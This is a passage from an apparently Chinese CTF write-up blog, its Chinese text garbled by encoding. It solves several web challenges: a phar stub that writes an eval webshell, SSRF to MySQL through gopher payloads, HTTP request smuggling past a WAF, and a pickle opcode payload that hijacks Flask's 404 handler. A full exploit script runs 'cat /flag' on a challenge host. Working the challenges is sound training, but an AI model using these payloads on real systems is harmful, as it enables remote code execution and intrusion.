finfo_file($finfo, $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">        finfo_close($finfo);</span><br><span class="line"></span><br><span class="line">        if (!in_array($mime_type, $allowed_mime_types)) &#123;</span><br><span class="line">            die(&#x27;unexpected mimetype&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // ext check</span><br><span class="line">        $ext = strtolower(pathinfo(basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]), PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line">        if (!in_array($ext, $allowed_extensions)) &#123;</span><br><span class="line">            die(&#x27;unexpected extension&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], &quot;/tmp/&quot; . basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]))) &#123;</span><br><span class="line">            echo &quot;File upload success!Please include with &#x27;url&#x27;&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;fail&quot;;</span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;url&#x27;])) &#123;</span><br><span class="line">    </span><br><span class="line">$include_url = basename($_GET[&#x27;url&#x27;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (!preg_match(&quot;/\.(zip|bz2|gz|xz|7z)/i&quot;, $include_url)) &#123;</span><br><span class="line">    die(&quot;unexpected extension&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">include &#x27;/tmp/&#x27; . $include_url;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form enctype=&#x27;multipart/form-data&#x27; method=&#x27;post&#x27;&gt;</span><br><span class="line">    &lt;input type=&#x27;file&#x27; name=&#x27;file&#x27;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;upload&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251112231834565.png" alt="image-20251112231834565"></p>
<p>ç»™äº†ç™½åå•ï¼Œåç¼€è¢«ç¦ç”¨äº†ï¼Œè¿˜å¯¹å†…å®¹ä¹Ÿåšäº†é™åˆ¶</p>
<p><img src="/../images/image-20251112232038692.png" alt="image-20251112232038692"></p>
<p>pharååºåˆ—åŒ–å‡½æ•°å’Œphpä»£ç æ®µ</p>
<p><img src="/../images/image-20251112232132842.png" alt="image-20251112232132842"></p>
<p>basenameé™åˆ¶ç›®å½•ç©¿è¶Šï¼ŒåŒ¹é…é™åˆ¶æ–‡ä»¶æ‰©å±•å</p>
<p><img src="/../images/image-20251112232307542.png" alt="image-20251112232307542"></p>
<p>æ„é€ pharæ–‡ä»¶å†™é©¬</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$phar=new Phar(&quot;phar.phar&quot;);</span><br><span class="line">$phar -&gt; startBuffering();</span><br><span class="line">$phar -&gt; setStub(&#x27;&lt;?php file_put_contents(&quot;/var/www/html/shell.php&quot;,&quot;&lt;?php eval(\$_POST[0]);?&gt;&quot;);__HALT_COMPILER();?&gt;&#x27;);</span><br><span class="line">$phar -&gt; addFromString(&quot;test.txt&quot;,&quot;test&quot;);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php -d phar.readonly=Off 1.php</span><br><span class="line">php 1.php</span><br><span class="line">gzip -c phar.phar &gt;phar.phar.gz</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251112234736198.png" alt="image-20251112234736198"></p>
<p>è¿›æ¥ä¹‹åå‘ç°æ²¡æœ‰æƒé™æŸ¥çœ‹flagæ–‡ä»¶</p>
<p><img src="/../images/image-20251112235107258.png" alt="image-20251112235107258"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/Dalock/article/details/149343860</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹sudoçš„ç‰ˆæœ¬</p>
<p><img src="/../images/image-20251112235344212.png" alt="image-20251112235344212"></p>
<p>æŸ¥çœ‹é…ç½®æ–‡ä»¶&#x2F;etc&#x2F;sudoers</p>
<p><img src="/../images/image-20251112235533743.png" alt="image-20251112235533743"></p>
<p>æŸ¥çœ‹è‡ªå·±çš„æƒé™ï¼Œç»™é…ä¸Šasd.asd.asdå°±æœ‰æƒé™äº†</p>
<p><img src="/../images/image-20251112235702084.png" alt="image-20251112235702084"></p>
<p><img src="/../images/image-20251112235840515.png" alt="image-20251112235840515"></p>
<h3 id="Apple-or-android"><a href="#Apple-or-android" class="headerlink" title="Apple or android"></a><strong>Apple or android</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é«˜çº§çš„éªŒè¯ç </span><br></pre></td></tr></table></figure>

<h4 id="è€ƒç‚¹ï¼šä»£ç å®¡è®¡ssrfï¼Œssrfæ‰“mysqlï¼ŒGopherusä½¿ç”¨è”åŠ¨"><a href="#è€ƒç‚¹ï¼šä»£ç å®¡è®¡ssrfï¼Œssrfæ‰“mysqlï¼ŒGopherusä½¿ç”¨è”åŠ¨" class="headerlink" title="è€ƒç‚¹ï¼šä»£ç å®¡è®¡ssrfï¼Œssrfæ‰“mysqlï¼ŒGopherusä½¿ç”¨è”åŠ¨"></a>è€ƒç‚¹ï¼šä»£ç å®¡è®¡ssrfï¼Œssrfæ‰“mysqlï¼ŒGopherusä½¿ç”¨è”åŠ¨</h4><p>è¿›æ¥çœ‹åˆ°æœ‰ä¸ªé€‰æ‹©è‹¹æœè¿˜æ˜¯å®‰å“ç™»å½•ï¼Œå°è¯•ç™»é™†å’Œä½¿ç”¨ä¸€ä¸‹åŠŸèƒ½ï¼Œè‹¹æœç™»é™†æœ‰ä¸ªç”Ÿæˆæ ¡éªŒçš„äºŒç»´ç ï¼Œåº·åº·ç»™çš„æºç ï¼ŒæŒ‰åŠŸèƒ½æ¥å®¡äº†ï¼Œæ²¡æœ‰çœ‹åˆ°ç›´æ¥ç»™çš„è·¯ç”±</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿›æ¥å…ˆçœ‹çš„index.phpï¼Œå®‰å“ç™»é™†çš„è¯å°±æ˜¯åˆ°login.phpï¼Œè‹¹æœç™»é™†çš„è¯å°±æ˜¯è§¦å‘getQRCode()å‡½æ•°</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251113191023819.png" alt="image-20251113191023819"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åœ¨login.phpå½“ä¸­æ˜¯æ²¡æœ‰ç»™ç™»é™†è·³è½¬çš„ï¼Œå®‰å“äººå°±æ˜¯ç™»é™†å¤±è´¥ä¸ç»™ç™»äº†ï¼Œé‚£ä¹ˆå°±åªèƒ½èµ°è‹¹æœç™»é™†äº†</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251113191339428.png" alt="image-20251113191339428"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è·Ÿè¿›è‹¹æœç™»é™†è§¦å‘çš„æ•ˆæœï¼Œä»getQRCode()å¼€å§‹--&gt;verify.php--&gt;Auth.phpçš„generateAndDisplayCode()---&gt;ImageProcessor.phpå½“ä¸­çš„å‡½æ•°ï¼Œå‚æ•°å¯æ§ï¼Œå‡½æ•°å¯¹ç›®æ ‡åœ°å€æ— é™åˆ¶è§¦å‘ssrf</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251113191559080.png" alt="image-20251113191559080"></p>
<p><img src="/../images/image-20251113191648181.png" alt="image-20251113191648181"></p>
<p><img src="/../images/image-20251113193101258.png" alt="image-20251113193101258"></p>
<p><img src="/../images/image-20251113193140025.png" alt="image-20251113193140025"></p>
<p><img src="/../images/image-20251113194025720.png" alt="image-20251113194025720"></p>
<p><img src="/../images/image-20251113194040305.png" alt="image-20251113194040305"></p>
<p><img src="/../images/image-20251113193940986.png" alt="image-20251113193940986"></p>
<p><img src="/../images/image-20251113194335647.png" alt="image-20251113194335647"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ok,å®¡è®¡å‡ºæ¥è¯·æ±‚äºŒç»´ç æ—¶å€™å­˜åœ¨ssrfã€åˆ©ç”¨ï¼šè¯·æ±‚çš„æ—¶å€™æ„å»ºæ¶æ„çš„HTTP_X_VERIFY_CODE_URLã€‘ï¼Œssrfå¸¸è§æ‰“çš„redisæ•°æ®åº“ï¼Œç”¨dictæ¥æ¢é’ˆä¸€ä¸‹æœ‰æ²¡æœ‰ç›¸åº”çš„æœåŠ¡</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ‰“çš„å¸¸è§„çš„6379å›æ˜¾æ­£å¸¸ï¼Œä½†æ˜¯3306çš„æ—¶å€™å›æ˜¾å¼‚å¸¸ï¼Œæ¨æµ‹å­˜åœ¨ç›¸åº”çš„mysqlæ–‡ä»¶ï¼ŒæŸ¥çœ‹å‡ºç°çš„binæ–‡ä»¶</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251113200753513.png" alt="image-20251113200753513"></p>
<p><img src="/../images/image-20251113200547566.png" alt="image-20251113200547566"></p>
<p><img src="/../images/image-20251113201210351.png" alt="image-20251113201210351"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç¡®å®å­˜åœ¨mysqlæœåŠ¡ï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯å¯ä»¥ssrfæ‰“çš„mysqlï¼Œä¸€èˆ¬ç”¨çš„curl æ¥è¿›è¡Œgopherçš„æ”»å‡»ï¼Œä½†æ˜¯å‘¢å‰é¢å®¡è®¡ä»£ç çš„æ—¶å€™æœ‰fsockopen</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç”¨çš„æ˜¯Gopherus3,Gopherusè¦ç”¨python2å°±æ¢æˆä»–äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Esonhugh/Gopherus3</span><br></pre></td></tr></table></figure>

<p>åšäº†mysqlå†™é©¬å­çš„é™åˆ¶fileprivä¿æŠ¤ï¼Œå°±å¸¸è§„çš„sqlæ³¨å…¥æ¢æµ‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">select group_concat(table_name) from information_schema.tables where</span><br><span class="line">table_schema=&#x27;ctf_db&#x27;</span><br><span class="line">select * from ctf_db.flags</span><br></pre></td></tr></table></figure>

<p>ç”¨Gopherus3æ„é€ çš„ç›¸åº”çš„payloadï¼Œåœ¨X-VERIFY-CODE-URLè®¿é—®</p>
<p>æ³¨æ„æ•°æ®åŒ…å¯èƒ½ä¼šè¢«æˆªæ–­ï¼Œå¯ä»¥ä½¿ç”¨åˆ†æ®µè¯»å–å‡½æ•°å–å‡º</p>
<p><img src="/../images/image-20251114001108429.png" alt="image-20251114001108429"></p>
<h3 id="waf-waf"><a href="#waf-waf" class="headerlink" title="waf?waf!"></a><strong>waf?waf!</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/articles/web/243652.html</span><br></pre></td></tr></table></figure>

<h4 id="è€ƒç‚¹ï¼šhttpè¯·æ±‚èµ°ç§é€ æˆçš„wafç»•è¿‡"><a href="#è€ƒç‚¹ï¼šhttpè¯·æ±‚èµ°ç§é€ æˆçš„wafç»•è¿‡" class="headerlink" title="è€ƒç‚¹ï¼šhttpè¯·æ±‚èµ°ç§é€ æˆçš„wafç»•è¿‡"></a>è€ƒç‚¹ï¼šhttpè¯·æ±‚èµ°ç§é€ æˆçš„wafç»•è¿‡</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åœ¨æ‰“?CTF? ?æœ€åä¸€å‘¨æ‰“äº†? ?æƒ³è¦flag??è·Ÿæˆ‘çš„wafè¯´å»å§,æˆ‘ä»¬éƒ½åœ¨ç”¨åŠ›çš„æ´»ç€</span><br></pre></td></tr></table></figure>

<p>åˆ†æä¸€ä¸‹é™„ä»¶ç»™çš„æºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿›æ¥æ˜¯ä¸€ä¸ªåŠé€€é»‘åå•</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251114081921650.png" alt="image-20251114081921650"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è§„èŒƒå­—ç¬¦ä¸²å‡½æ•°</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251114082030577.png" alt="image-20251114082030577"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpè§£æ</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251114082055661.png" alt="image-20251114082055661"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä»£ç†æœåŠ¡å™¨é€»è¾‘</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251114083040736.png" alt="image-20251114083040736"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ¼æ´ç‚¹ï¼ševal</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251114083126739.png" alt="image-20251114083126739"></p>
<p>æ¼æ´ç‚¹è¦ä½¿ç”¨çš„æ˜¯postè¯·æ±‚ï¼Œå…³æ³¨ä»£ç†æœåŠ¡å™¨é€»è¾‘</p>
<p>ä»£ç†æœåŠ¡å™¨åˆ™æ£€æŸ¥ä½ çš„å‚æ•°ï¼Œè¿‡æ»¤æ¶æ„å‚æ•°,å…³æ³¨å‰åç«¯è§£æçš„è¯·æ±‚</p>
<p>å¤´ï¼Œæ€ä¹ˆæ ·ç®—æ˜¯ä¸€ä¸ªå®Œæ•´çš„æ•°æ®åŒ…<img src="/../images/image-20251114084303877.png" alt="image-20251114084303877"></p>
<p><img src="/../images/image-20251114084429534.png" alt="image-20251114084429534"></p>
<p>å°±æ˜¯å‰ç«¯å¤„ç†è¯·æ±‚å¤´clï¼Œåç«¯å¤„ç†teï¼Œå‡ºç°äº†è§£æå·®å¼‚ï¼Œè§¦å‘çš„httpè¯·æ±‚èµ°ç§ï¼Œå¯ä»¥çœ‹çœ‹å‰é¢è´´çš„æ–‡ç« </p>
<p><img src="/../images/image-20251114084605835.png" alt="image-20251114084605835"></p>
<p>è§£æTEæ—¶ä¼šæŠŠ0è§†ä½œæ•°æ®åœæ­¢çš„æ ‡å¿—ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥åŠ ä¸ª0ï¼Œç„¶ååé¢åŠ ä¸ª&amp;ç”¨äºä¼ é€’å…¶ä»–å‚æ•°ï¼Œæ³¨æ„æ˜¯pythonçš„æ‰§è¡Œå‘½ä»¤</p>
<p><img src="/../images/image-20251114090106658.png" alt="image-20251114090106658"></p>
<h3 id="è¿™åˆåˆæ˜¯ä»€ä¹ˆå‡½æ•°"><a href="#è¿™åˆåˆæ˜¯ä»€ä¹ˆå‡½æ•°" class="headerlink" title="è¿™åˆåˆæ˜¯ä»€ä¹ˆå‡½æ•°"></a><strong>è¿™åˆåˆæ˜¯ä»€ä¹ˆå‡½æ•°</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ²¡è§è¿‡ï¼Ÿæœä¸€ä¸‹ï¼åœ¨/flag</span><br></pre></td></tr></table></figure>

<h4 id="è€ƒç‚¹ï¼šPickleååºåˆ—åŒ–åŠç»•è¿‡é»‘åå•"><a href="#è€ƒç‚¹ï¼šPickleååºåˆ—åŒ–åŠç»•è¿‡é»‘åå•" class="headerlink" title="è€ƒç‚¹ï¼šPickleååºåˆ—åŒ–åŠç»•è¿‡é»‘åå•"></a>è€ƒç‚¹ï¼šPickleååºåˆ—åŒ–åŠç»•è¿‡é»‘åå•</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/news/7032</span><br><span class="line">https://goodapple.top/archives/1069</span><br><span class="line">https://dummykitty.github.io/posts/pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®æç¤ºä¾æ—§æ˜¯&#x2F;srcä¸‹çš„æºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, render_template</span><br><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">PICKLE_BLACKLIST = [</span><br><span class="line">    b&#x27;eval&#x27;,</span><br><span class="line">    b&#x27;os&#x27;,</span><br><span class="line">    b&#x27;x80&#x27;,</span><br><span class="line">    b&#x27;before&#x27;,</span><br><span class="line">    b&#x27;after&#x27;,</span><br><span class="line">]</span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/src&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def src():</span><br><span class="line">    return open(__file__, encoding=&quot;utf-8&quot;).read()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/deser&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def deser():</span><br><span class="line">    a = request.form.get(&#x27;a&#x27;)</span><br><span class="line">    if not a:</span><br><span class="line">        return &quot;fail&quot;</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        decoded_data = base64.b64decode(a)</span><br><span class="line">        print(decoded_data)</span><br><span class="line">    except: </span><br><span class="line">        return &quot;fail&quot;</span><br><span class="line">    </span><br><span class="line">    for forbidden in PICKLE_BLACKLIST:</span><br><span class="line">        if forbidden in decoded_data:</span><br><span class="line">            return &quot;waf&quot;</span><br><span class="line">    try:</span><br><span class="line">        result = pickle.loads(decoded_data)</span><br><span class="line">        return &quot;done&quot;</span><br><span class="line">    except:</span><br><span class="line">        return &quot;fail&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=5000)</span><br></pre></td></tr></table></figure>

<p>å‡ºç°äº†ååºåˆ—åŒ–å‡½æ•°pickle.loads()</p>
<p><img src="/../images/image-20251114091410013.png" alt="image-20251114091410013"></p>
<p>å›å¤´å…³æ³¨ä¸€ä¸‹é»‘åå•</p>
<p><img src="/../images/image-20251114091454785.png" alt="image-20251114091454785"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval,osæ˜¯å‘½ä»¤æ‰§è¡Œçš„é»‘åå•</span><br><span class="line">beforeå’Œafteræ˜¯é’©å­å‡½æ•°è¿‡æ»¤ï¼Œ</span><br><span class="line">pickle.dumps()ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºx80ï¼Œ</span><br></pre></td></tr></table></figure>

<p>evalå¯ä»¥ç”¨execï¼Œé’©å­å‡½æ•°å¯ä»¥ç”¨error_handlerï¼Œosç”¨æ‹¼æ¥ï¼Œ&#x2F;x80å¯ä»¥è‡ªå®šä¹‰ä¸ºåè®®ç‰ˆæœ¬0å°±ä¸ä¼šå‡ºç°&#x2F;x80</p>
<p>æ„é€ æ¶æ„çš„æ“ä½œç opcodeã€è´´çš„éƒ½æ˜¯å®˜pçš„wpã€‘</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">opcode = b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="line">eval</span><br><span class="line">(S&#x27;print(__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read())&#x27;</span><br><span class="line">tR.&#x27;&#x27;&#x27;</span><br><span class="line">pickle.loads(opcode) </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cbuiltins æ˜¯ pickle åè®®ï¼ˆç‰ˆæœ¬ 0ï¼‰ é‡Œçš„ä¸€æ¡ æ“ä½œç </span><br><span class="line">ç¯¡æ”¹ Flask 404 handlerï¼Œå®ç° RCE</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">opcode = b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="line">exec</span><br><span class="line">(S&#x27;global exc_class;global code; exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a: __import__(&#x27;o&#x27;+&#x27;s&#x27;).popen(request.args.get(&#x27;0&#x27;)).read()&#x27;</span><br><span class="line">tR.&#x27;&#x27;&#x27;</span><br><span class="line">pickle.loads(opcode)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">BASE_URL = &quot;http://challenge.ilovectf.cn:30554&quot;</span><br><span class="line"></span><br><span class="line">opcode = b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="line">exec</span><br><span class="line">(S&#x27;global exc_class;global code; exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a: __import__(&#x27;o&#x27;+&#x27;s&#x27;).popen(request.args.get(&#x27;0&#x27;)).read()&#x27;</span><br><span class="line">tR.&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">payload = base64.b64encode(opcode).decode()</span><br><span class="line"></span><br><span class="line">def send_requests():</span><br><span class="line">    try:</span><br><span class="line">        # ç¬¬ä¸€æ­¥ï¼šä¸‹å‘ payload</span><br><span class="line">        deser_url = f&quot;&#123;BASE_URL&#125;/deser&quot;</span><br><span class="line">        post_data = &#123;&quot;a&quot;: payload&#125;</span><br><span class="line">        print(f&quot;[+] POST &#123;deser_url&#125;  data=&#123;post_data&#125;&quot;)</span><br><span class="line">        r1 = requests.post(deser_url, data=post_data, timeout=10)</span><br><span class="line">        print(f&quot;[*] POST çŠ¶æ€ç ï¼š&#123;r1.status_code&#125;  å“åº”ï¼š&#123;r1.text&#125;\n&quot;)</span><br><span class="line"></span><br><span class="line">        # ç¬¬äºŒæ­¥ï¼šè§¦å‘ 404 å¹¶æ‰§è¡Œå‘½ä»¤</span><br><span class="line">        get_url = f&quot;&#123;BASE_URL&#125;/1&quot;</span><br><span class="line">        get_params = &#123;&quot;0&quot;: &quot;cat /flag&quot;&#125;</span><br><span class="line">        print(f&quot;[+] GET  &#123;get_url&#125;  params=&#123;get_params&#125;&quot;)</span><br><span class="line">        r2 = requests.get(get_url, params=get_params, timeout=10)</span><br><span class="line">        print(f&quot;[*] GET  çŠ¶æ€ç ï¼š&#123;r2.status_code&#125;  å“åº”ï¼š&#123;r2.text&#125;&quot;)</span><br><span class="line">    except requests.RequestException as e:</span><br><span class="line">        print(f&quot;[!] è¯·æ±‚å¤±è´¥ï¼š&#123;e&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    send_requests()</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251114102556131.png" alt="image-20251114102556131"></p>
<h3 id="å¥½åƒä»€ä¹ˆéƒ½èƒ½è¯»"><a href="#å¥½åƒä»€ä¹ˆéƒ½èƒ½è¯»" class="headerlink" title="å¥½åƒä»€ä¹ˆéƒ½èƒ½è¯»"></a><strong>å¥½åƒä»€ä¹ˆéƒ½èƒ½è¯»</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¯¥è¯»äº›ä»€ä¹ˆå‘¢ï¼Ÿ</span><br></pre></td></tr></table></figure>

<h4 id="è€ƒç‚¹ï¼šflaskè®¡ç®—pinç ï¼Œæ–°ç‰ˆæœ¬Werkzeugçš„tip"><a href="#è€ƒç‚¹ï¼šflaskè®¡ç®—pinç ï¼Œæ–°ç‰ˆæœ¬Werkzeugçš„tip" class="headerlink" title="è€ƒç‚¹ï¼šflaskè®¡ç®—pinç ï¼Œæ–°ç‰ˆæœ¬Werkzeugçš„tip"></a>è€ƒç‚¹ï¼šflaskè®¡ç®—pinç ï¼Œæ–°ç‰ˆæœ¬Werkzeugçš„tip</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/m1xian/p/18528813</span><br><span class="line">https://sun1028.top/2025/05/09/flask%e8%ae%a1%e7%ae%97pin%e7%a0%81/</span><br></pre></td></tr></table></figure>

<p>éšä¾¿è®¿é—®ä¸ªæ–‡ä»¶ï¼ŒæŸ¥çœ‹æŠ¥é”™</p>
<p><img src="/../images/image-20251114104245794.png" alt="image-20251114104245794"></p>
<p><img src="/../images/image-20251114104254487.png" alt="image-20251114104254487"></p>
<p>æŸ¥çœ‹app.pyæ–‡ä»¶ï¼Œå‘ç°å¼€å¯äº†debugæ¨¡å¼</p>
<p><img src="/../images/image-20251114104350857.png" alt="image-20251114104350857"></p>
<p>æ€è·¯å°±æ˜¯è¦æ€ä¹ˆä½¿ç”¨debugæ¨¡å¼ï¼Œä½¿ç”¨&#x2F;consoleè°ƒè¯•å™¨ï¼Œå‰é¢çš„æŠ¥é”™æ˜¾ç¤ºæ˜¯werkzeug çš„ debug æ¨¡å—ï¼Œ</p>
<p>werkzeug çš„ debug æ¨¡å—ä¸­æä¾›çš„ä¸€ä¸ªå®‰å…¨æœºåˆ¶ï¼Œç”¨äºä¿æŠ¤è°ƒè¯•å™¨ï¼ˆ<code>/console</code>ï¼‰ä¸è¢«æœªæˆæƒè®¿é—®ã€PIN ç ã€‘</p>
